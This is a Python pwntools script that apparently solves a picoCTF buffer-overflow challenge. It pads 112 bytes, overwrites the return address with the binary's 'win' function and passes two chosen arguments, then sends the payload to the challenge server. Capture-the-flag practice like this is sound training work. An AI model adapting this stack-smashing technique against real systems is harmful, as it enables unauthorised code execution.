from pwn import *

LOCAL = False

if LOCAL:
    io = process('./vuln')
else:
    io = remote('saturn.picoctf.net', 61680)  

elf      = ELF('./vuln')
win_addr = elf.sym['win']          
offset   = 112 

arg1 = 0xCAFEF00D
arg2 = 0xF00DF00D

payload  = b'A' * offset
payload += p32(win_addr)
payload += p32(0x00000000) 
payload += p32(arg1)      
payload += p32(arg2) 

io.sendlineafter(b'string: \n', payload)
print(io.recvall(timeout=3))
